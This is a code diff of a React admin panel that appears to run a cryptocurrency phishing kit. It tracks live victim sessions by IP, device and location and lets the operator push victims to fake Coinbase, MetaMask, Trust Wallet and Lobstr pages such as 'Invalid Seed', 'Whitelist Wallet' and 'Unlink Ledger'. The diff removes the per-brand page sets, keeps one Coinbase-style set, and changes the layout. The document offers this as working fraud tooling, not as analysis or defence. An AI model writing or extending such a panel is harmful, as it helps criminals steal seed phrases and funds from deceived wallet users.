@@ -4,8 +4,9 @@ import { useAdminSocket } from '../contexts/AdminSocket';
 import notificationSound from './notification.mp3';
 
 const ANIMAL_EMOJIS = [
-  '🐟', '🐠', '🐡','🐙', '🦈', '🐬',
-  '🦭','🦦'
+  '🦊', '🦁', '🐯', '🐶', '🐱', '🐼', '🐨', '🐮', '🐷', '🐸',
+  '🦄', '🐵', '🐰', '🦒', '🦘', '🦔', '🐻', '🐙', '🦈', '🐬',
+  '🦭', '🦩', '🦥', '🦦', '🦡', '🦃', '🦆', '🦅', '🐺', '🐝'
 ];
 
 const DeviceDetectorUtil = {
@@ -148,18 +149,17 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
       </div>
 
       {/* Actions Row */}
-      <div className="space-y-3 mt-4">
+      <div className="flex items-center justify-between mt-4">
         <CategorizedPageSelect
           selectedPage={selectedPage}
           onPageChange={setSelectedPage}
           isHovered={false}
-          selectedBrand={selectedBrand}
         />
         
-        <div className="flex items-center justify-between">
+        <div className="flex items-center space-x-2">
           <button
             onClick={() => onRedirect(session.id, selectedPage)}
-            className={`${actionButtonStyle} bg-blue-500/20 text-blue-400 flex-1 mr-2`}
+            className={`${actionButtonStyle} bg-blue-500/20 text-blue-400`}
             title="Redirect User"
           >
             <ExternalLink className={actionIconStyle} />
@@ -167,7 +167,7 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
 
           <button
             onClick={() => onRemove(session.id)}
-            className={`${actionButtonStyle} bg-orange-500/20 text-orange-400 flex-1 mx-1`}
+            className={`${actionButtonStyle} bg-orange-500/20 text-orange-400`}
             title="Remove Session"
           >
             <Trash2 className={actionIconStyle} />
@@ -175,7 +175,7 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
 
           <button
             onClick={() => onBan(session.ip)}
-            className={`${actionButtonStyle} bg-red-500/20 text-red-400 flex-1 ml-2`}
+            className={`${actionButtonStyle} bg-red-500/20 text-red-400`}
             title="Ban IP"
           >
             <Ban className={actionIconStyle} />
@@ -186,88 +186,63 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
   );
 };
 
-const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered, selectedBrand }) => {
-  
-  const brandCategories = {
-    Coinbase: {
-      Introduction: [
-        { id: 'loading.html', name: 'Loading' },
-        { id: 'review.html', name: 'Review' },
-        { id: 'estimatedbalance.html', name: 'Estimated Balance' },
-        { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
-      ],
-      'Hardware Wallets': [
-        { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
-        { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
-        { id: 'MoveToCold.html', name: 'Move to Cold' }
-      ],
-      Awaiting: [
-        { id: 'Pendingreview.html', name: 'Pending Review' }
-      ],
-      'Completed Task': [
-        { id: 'Completed.html', name: 'Review Completed' },
-        { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
-      ],
-      Others: [
-        { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
-        { id: 'InvalidSeed.html', name: 'Invalid Seed' }
-      ]
-    },
-    Lobstr: {
-      Loading: [
-        { id: 'lobstrloading.html', name: 'Loading' }
-      ],
-      'Account Actions': [
-        { id: 'lobstrreview.html', name: 'Review' },
-        { id: 'lobstrcomplete.html', name: 'Complete' }
-      ]
-    },
-    MetaMask: {
-      'Security Check': [
-        { id: 'metamaskloading.html', name: 'Loading' },
-        { id: 'metamaskreview.html', name: 'Review Security' }
-      ],
-      'Wallet Actions': [
-        { id: 'metamaskdisconnect.html', name: 'Disconnect' },
-        { id: 'metamaskupdate.html', name: 'Update Required' }
-      ]
-    },
-    'Trust Wallet': {
-      Main: [
-        { id: 'trustloading.html', name: 'Loading' },
-        { id: 'trustreview.html', name: 'Review' }
-      ],
-      Security: [
-        { id: 'trustsecurity.html', name: 'Security Check' },
-        { id: 'trustcomplete.html', name: 'Complete' }
-      ]
-    }
-  };
+const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered }) => {
+  const pageCategories = {
+    Introduction: [
+      { id: 'loading.html', name: 'Loading' },
+      { id: 'review.html', name: 'Review' },
+      { id: 'estimatedbalance.html', name: 'Estimated Balance' },
+      { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
+    ],
+    'Hardware Wallets': [
+      { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
+      { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
+      { id: 'MoveToCold.html', name: 'Move to Cold' }
+    ],
+    Awaiting: [
+      { id: 'Pendingreview.html', name: 'Pending Review' }
+    ],
+    'Completed Task': [
+      { id: 'Completed.html', name: 'Review Completed' },
+      { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
+    ],
+    Others: [
+      { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
+      { id: 'InvalidSeed.html', name: 'Invalid Seed' }
+    ]
+  }
 
   return (
-    <select
-      value={selectedPage}
-      onChange={(e) => onPageChange(e.target.value)}
-      className={`
-        text-xs rounded-lg border min-w-[200px] max-w-[250px]
-        transition-all duration-300
-        ${isHovered ? 'bg-white/[0.08] border-white/20' : 'bg-white/[0.05] border-white/10'}
-        text-white/80 py-1.5 px-2
-        backdrop-blur-sm
-        focus:outline-none focus:border-blue-500/30 focus:ring-1 focus:ring-blue-500/20
-        shadow-lg shadow-black/5
-      `}
-    >
-      {Object.entries(brandCategories[selectedBrand] || {}).map(([category, pages]) => (
-        <optgroup key={category} label={category} className="bg-[#1A1A1A] text-white/60">
-          {pages.map(page => (
-            <option key={page.id} value={page.id} className="bg-[#1A1A1A] py-1">
-              {page.name}
-            </option>
-          ))}
-        </optgroup>
-      ))}
-    </select>
+    <div className="relative flex-shrink-0" style={{ maxWidth: '180px' }}>
+      <select
+        value={selectedPage}
+        onChange={(e) => onPageChange(e.target.value)}
+        style={{ 
+          transform: 'translate3d(0, 0, 0)',
+          transformOrigin: 'top'
+        }}
+        className={`
+          relative text-xs rounded-lg border w-full
+          transition-all duration-300
+          ${isHovered ? 'bg-white/[0.08] border-white/20' : 'bg-white/[0.05] border-white/10'}
+          text-white/80 py-1 px-2
+          backdrop-blur-sm
+          focus:outline-none focus:border-blue-500/30 focus:ring-1 focus:ring-blue-500/20
+          shadow-lg shadow-black/5
+          z-50
+        `}
+      >
+        {Object.entries(pageCategories).map(([category, pages]) => (
+          <optgroup key={category} label={category} className="bg-[#1A1A1A] text-white/60">
+            {pages.map(page => (
+              <option key={page.id} value={page.id} className="bg-[#1A1A1A]">
+                {page.name}
+              </option>
+            ))}
+          </optgroup>
+        ))}
+      </select>
+    </div>
   );
 };
 
@@ -352,47 +327,45 @@ const SessionHeaderRow = () => {
       <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent opacity-0" />
       
       <div className="relative flex items-center justify-between">
-        <div className="flex flex-col w-1/6">
+        <div className="flex flex-col w-1/4">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Session Info
           </div>
         </div>
-        <div className="w-1/8">
+        <div className="w-1/6">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Device
           </div>
         </div>
-        <div className="w-1/8">
+        <div className="w-1/6">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Location
           </div>
         </div>
-        <div className="w-1/8">
+        <div className="w-1/6">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Current Page
           </div>
         </div>
-        <div className="w-1/8">
+        <div className="w-1/6">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Last Active
           </div>
         </div>
-        <div className="w-1/8">
+        <div className="w-1/6">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Status
           </div>
         </div>
-        <div className="w-1/4">
-          <div className="text-xs font-medium text-white/60 uppercase tracking-wider text-right">
-            Actions
-          </div>
+        <div className="w-1/6">
+          {/* Space for actions */}
         </div>
       </div>
     </div>
   );
 };
 
-const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand }) => {
+const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
   const { settings } = useAdminSocket();
   const [selectedPage, setSelectedPage] = useState(session.currentPage || 'loading.html');
   const [isHovered, setIsHovered] = useState(false);
@@ -447,7 +420,7 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
                      transition-opacity duration-500 ${isHovered ? 'opacity-100' : 'opacity-0'}`} />
 
       <div className="relative flex items-center justify-between">
-        <div className="flex flex-col w-1/6">
+        <div className="flex flex-col w-1/4">
           <div className="flex items-center space-x-6">
             <div className="flex flex-col">
               <div className="flex items-center space-x-2">
@@ -490,20 +463,20 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
           </div>
         </div>
 
-        <div className="w-1/8">
+        <div className="w-1/6">
           <div className="flex flex-col">
             <span className="text-sm text-white/80">{os}</span>
             <span className="text-xs text-white/60">{browser}</span>
           </div>
         </div>
 
-        <div className="w-1/8">
+        <div className="w-1/6">
           <span className="text-sm text-white/60">
             {session.city}, {session.country}
           </span>
         </div>
 
-        <div className="w-1/8">
+        <div className="w-1/6">
           <div className={`relative inline-flex items-center px-2 py-1 rounded-md 
                         overflow-hidden transition-all duration-300
                         ${isHovered ? 'translate-x-1' : ''}`}>
@@ -515,17 +488,17 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
           </div>
         </div>
 
-        <div className="w-1/8">
+        <div className="w-1/6">
           <HeartbeatIndicator lastHeartbeat={session.lastHeartbeat} />
         </div>
 
-        <div className="w-1/8">
+        <div className="w-1/6">
           <StatusBadge 
             status={session.loading ? 'loading' : (session.connected || session.loading ? 'connected' : 'inactive')} 
           />
         </div>
 
-        <div className="relative flex items-center justify-end space-x-2 w-1/4">
+        <div className="relative flex items-center justify-end space-x-4 w-1/6">
           <div className={`absolute inset-0 rounded-lg transition-opacity duration-300
                         ${isHovered ? 'opacity-100' : 'opacity-0'}`}>
             <div className="absolute inset-0 bg-white/[0.03] backdrop-blur-sm rounded-lg" />
@@ -536,7 +509,6 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
             selectedPage={selectedPage}
             onPageChange={setSelectedPage}
             isHovered={isHovered}
-            selectedBrand={selectedBrand}
           />
 
           <button
@@ -574,7 +546,7 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew, selectedBrand
   );
 };
 
-const SessionList = ({ selectedBrand }) => {
+const SessionList = () => {
   // Add settings to the destructured values from useAdminSocket
   const { sessions, banIP, redirectUser, removeSession, settings } = useAdminSocket();
   const [isHovered, setIsHovered] = useState(false);
@@ -653,7 +625,6 @@ const SessionList = ({ selectedBrand }) => {
                   onBan={handleBanIP}
                   onRemove={handleRemoveSession}
                   isNew={newSessions.has(session.id)}
-                  selectedBrand={selectedBrand}
                 />
               ))}
             </div>
@@ -669,7 +640,6 @@ const SessionList = ({ selectedBrand }) => {
             onBan={handleBanIP}
             onRemove={handleRemoveSession}
             isNew={newSessions.has(session.id)}
-            selectedBrand={selectedBrand}
           />
         ))}
       </div>
